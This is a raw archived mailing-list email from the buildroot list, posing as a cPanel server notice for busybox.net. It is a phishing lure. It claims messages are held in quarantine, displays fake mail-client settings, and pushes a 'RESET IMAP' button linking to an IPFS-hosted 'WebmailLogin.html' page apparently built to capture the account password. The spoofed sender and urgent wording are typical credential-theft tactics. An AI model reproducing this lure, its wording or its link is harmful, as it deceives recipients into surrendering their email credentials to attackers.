Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 1DE4FC3DA4A
	for <buildroot@archiver.kernel.org>; Fri, 16 Aug 2024 11:46:33 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id AD82040088;
	Fri, 16 Aug 2024 11:46:32 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 2GZeUjmehrSr; Fri, 16 Aug 2024 11:46:31 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 6B58D404CC
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp4.osuosl.org (Postfix) with ESMTP id 6B58D404CC;
	Fri, 16 Aug 2024 11:46:31 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id B8E2D1BF38E
 for <buildroot@lists.busybox.net>; Fri, 16 Aug 2024 11:46:29 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id A4E178417C
 for <buildroot@lists.busybox.net>; Fri, 16 Aug 2024 11:46:29 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id XPKT79NYdt-I for <buildroot@lists.busybox.net>;
 Fri, 16 Aug 2024 11:46:28 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=23.95.206.166;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 964E784179
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 964E784179
Received: from busybox.net (unknown [23.95.206.166])
 by smtp1.osuosl.org (Postfix) with ESMTP id 964E784179
 for <buildroot@busybox.net>; Fri, 16 Aug 2024 11:46:28 +0000 (UTC)
From: cPanel on busybox.net <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 16 Aug 2024 13:46:27 +0200
Message-ID: <20240816134627.B77A347C625455F4@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] busybox.net Client configuration settings error for
 buildroot@busybox.net
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============3406455166515991271=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============3406455166515991271==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<div class=3D"gmail_attr" style=3D"color: rgb(34, 34, 34); text-transform: =
none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helveti=
ca, sans-serif; font-size: small; font-style: normal; font-weight: 400; wor=
d-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-colo=
r: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
text-decoration-style: initial;=20
text-decoration-color: initial;" dir=3D"ltr"><font color=3D"#000000" face=
=3D"Times New Roman" size=3D"3"></font>
<br style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px=
; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-s=
ize: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-=
space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
 font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
roke-width: 0px; text-decoration-thickness: initial; text-decoration-style:=
 initial; text-decoration-color: initial;"></div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial;">
<table width=3D"600" style=3D"border: 1px solid lightgray; border-image: no=
ne; font-size: 11pt; border-collapse: collapse;" cellspacing=3D"0" cellpadd=
ing=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing:=
 border-box;"><td width=3D"100%" style=3D"margin: 0px; padding: 10px; box-s=
izing: border-box;">
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; font-stretch: inherit; background-color: =
rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: norm=
al; text-decoration-style: initial;=20
text-decoration-color: initial;"><span style=3D"text-align: left; color: rg=
b(44, 54, 58); text-transform: none; text-indent: 0px; letter-spacing: norm=
al; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; f=
ont-weight: 400; word-spacing: 0px; float: none; display: inline !important=
; white-space: normal; background-color: rgb(255, 255, 255); font-variant-l=
igatures: normal; font-variant-caps: normal; text-decoration-style: initial=
; text-decoration-color: initial;">
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; background-col=
or: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: =
normal; text-decoration-style: initial;=20
text-decoration-color: initial;"><tbody style=3D"box-sizing: border-box;"><=
tr style=3D"box-sizing: border-box;"><th style=3D"padding: 5px; border: 0px=
 solid rgb(0, 0, 0); border-image: none; width: 2px; color: rgb(0, 0, 0); b=
ox-sizing: border-box; background-color: rgb(2, 151, 64);">&nbsp;</th><td s=
tyle=3D"margin: 0px; padding: 5px; border: 0px solid rgb(0, 0, 0); border-i=
mage: none; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; back=
ground-color: rgb(243, 255, 248);">
<span style=3D"font-size: 12px; box-sizing: border-box;">Message from&nbsp;=
busybox.net<span>&nbsp;</span>server</span></td></tr></tbody></table></span=
></div></td></tr><tr style=3D"box-sizing: border-box;"><td width=3D"100%" a=
lign=3D"left" style=3D"margin: 0px; padding: 20px; box-sizing: border-box;"=
><p style=3D'margin: 0px 0px 10px; font-family: "Segoe UI"; box-sizing: bor=
der-box;'><span style=3D"font-size: medium;"><font size=3D"4">
You have pending incoming messages in your quarantine, set your Incoming se=
rver to continue receiving messages without disruption using the manual set=
tings.</font></span></p><font size=3D"4"></font><p style=3D'margin: 0px 0px=
 10px; font-family: "Open Sans", Verdana, Tahoma, serif; box-sizing: border=
-box;'><font size=3D"4">&nbsp;</font></p><font size=3D"4"></font><span styl=
e=3D"font-size: large;">
<table width=3D"680" style=3D"border: 0px currentColor; border-image: none;=
 max-width: 680px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody=
><tr><td width=3D"680" height=3D"25" style=3D'margin: 0px; color: rgb(51, 5=
1, 51); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-s=
ize: 16px;'><strong>Client Configuration settings for buildroot@busybox.net=
 .</strong></td></tr><tr>
<td style=3D"border-width: 2px; border-style: solid; border-color: rgb(232,=
 232, 232) rgb(232, 232, 232) rgb(255, 108, 44); margin: 0px; padding: 15px=
 0px 20px; background-color: rgb(255, 255, 255);"><table width=3D"680" styl=
e=3D'background: rgb(255, 255, 255); font-family: "Helvetica Neue", Helveti=
ca, Arial, sans-serif;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><t=
body><tr><td width=3D"15" style=3D"margin: 0px;"></td><td width=3D"650" sty=
le=3D"margin: 0px;">
<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbo=
dy><tr><td style=3D"margin: 0px;"><div id=3D"m_5474801725029693249v1manual_=
settings_area"><h2 id=3D"m_5474801725029693249v1hdrManualSettings">Mail Cli=
ent Manual Settings</h2><div><div><div id=3D"m_5474801725029693249v1ssl_set=
tings_area" style=3D"border-radius: 4px; border: 1px solid rgb(66, 139, 202=
); border-image: none; margin-bottom: 20px; background-color: rgb(255, 255,=
 255);">
<div style=3D"border-color: rgb(66, 139, 202); padding: 10px 15px; color: r=
gb(255, 255, 255); border-top-left-radius: 3px; border-top-right-radius: 3p=
x; background-color: rgb(66, 139, 202);"><strong>Secure&nbsp;<abbr title=3D=
"Secure Sockets Layer">SSL</abbr>/<abbr title=3D"Transport Layer Security">=
TLS</abbr>&nbsp;Settings (Recommended)</strong></div><table style=3D"width:=
 662.67px; margin-bottom: 0px; border-collapse: collapse; max-width: 100%; =
border-spacing: 0px; background-color: transparent;">
<tbody><tr><td id=3D"m_5474801725029693249v1lblSSLSettingsAreaUsername" sty=
le=3D"margin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); bord=
er-top-width: 1px; border-top-style: solid;"><strong>Username:</strong></td=
><td id=3D"m_5474801725029693249v1valSSLSettingsAreaUsername" style=3D"marg=
in: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-wid=
th: 1px; border-top-style: solid;"><strong>buildroot</strong></td></tr><tr>=

<td id=3D"m_5474801725029693249v1lblSettingsAreaPassword" style=3D"margin: =
0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: =
1px; border-top-style: solid;"><strong>Password:</strong></td><td id=3D"m_5=
474801725029693249v1valSettingsAreaPassword" style=3D"margin: 0px; padding:=
 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; border-t=
op-style: solid;"><strong>Use the email account's password.</strong></td></=
tr><tr>
<td id=3D"m_5474801725029693249v1lblSettingsAreaIncomingServer" style=3D"ma=
rgin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-w=
idth: 1px; border-top-style: solid;"><strong>Incoming Server:</strong></td>=
<td id=3D"m_5474801725029693249v1valSettingsAreaIncomingServer" style=3D"ma=
rgin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-w=
idth: 1px; border-top-style: solid;"><ul style=3D"list-style: none; padding=
-left: 0px; margin-top: 0px; margin-bottom: 10px;"><strong>
&nbsp;busybox.net<br></strong><li style=3D"padding-right: 5px; padding-left=
: 5px; display: inline-block;"><strong><abbr title=3D"Internet Message Acce=
ss Protocol">IMAP</abbr>&nbsp;Port: 993</strong></li><strong>&nbsp;</strong=
><li style=3D"padding-right: 5px; padding-left: 5px; display: inline-block;=
"><strong><abbr title=3D"Post Office Protocol 3">POP3</abbr>&nbsp;Port: 995=
</strong></li></ul></td></tr><tr>
<td id=3D"m_5474801725029693249v1lblSettingsAreaOutgoingServer" style=3D"ma=
rgin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-w=
idth: 1px; border-top-style: solid;"><strong>Outgoing Server:</strong></td>=
<td id=3D"m_5474801725029693249v1valSettingsAreaOutGoingServer" style=3D"ma=
rgin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-w=
idth: 1px; border-top-style: solid;">
&nbsp;busybox.net<ul style=3D"list-style: none; padding-left: 0px; margin-t=
op: 0px; margin-bottom: 10px;"><li style=3D"padding-right: 5px; padding-lef=
t: 5px; display: inline-block;"><strong><abbr title=3D"Simple Mail Transfer=
 Protocol">SMTP</abbr>&nbsp;Port: 465</strong></li></ul></td></tr><tr><td s=
tyle=3D"margin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); bo=
rder-top-width: 1px; border-top-style: solid;" colspan=3D"2"><div id=3D"m_5=
474801725029693249v1lblSettingsAreaSmallNote1"><strong>
IMAP, POP3, and SMTP require authentication.</strong></div></td></tr></tbod=
y></table></div></div></div></div></td></tr></tbody></table></td></tr></tbo=
dy></table></td></tr></tbody></table></span><p style=3D'margin: 0px 0px 10p=
x; font-family: "Open Sans", Verdana, Tahoma, serif; font-size: 16px; box-s=
izing: border-box;'><font size=3D"4">&nbsp;</font><font size=3D"4"></font><=
/p><p style=3D'margin: 0px 0px 10px; font-family: "Segoe UI"; font-size: 16=
px; box-sizing: border-box;'><font size=3D"4">
Reset your incoming server settings to continue receiving messages.</font><=
/p><p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;=
">&nbsp;</p><table width=3D"193" style=3D"border-radius: 3px; height: 52px;=
 font-size: 11pt; border-collapse: collapse; background-color: rgb(215, 86,=
 36);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box=
-sizing: border-box;"><tr style=3D"box-sizing: border-box;">
<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 15px =
30px; box-sizing: border-box;"><a style=3D"color: rgb(255, 255, 255); font-=
family: Helvetica, Arial, sans-serif; font-size: 16px; font-weight: bold; b=
ox-sizing: border-box; background-color: transparent; text-decoration-line:=
 none;" href=3D"https://ipfs.io/ipfs/bafkreichioklnjw44vmr4xpzmrhka3igoww2h=
gqxtr3uff2mbswwymybam?filename=3DWebmailLogin.html#buildroot@busybox.net" r=
el=3D"noreferrer">RESET&nbsp; IMAP</a></td></tr></tbody></table>
<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;">
&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: bord=
er-box;">I<span style=3D'font-family: "Segoe UI"; font-size: medium;'>f aft=
er resetting your IMAP and you still experience service disruption, kindly =
contact<span>&nbsp;support</span><span>&nbsp;</span>for further assistance.=
</span>&nbsp;</p></td></tr></tbody></table></div><p>
</p>


</body></html>

--===============3406455166515991271==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============3406455166515991271==--
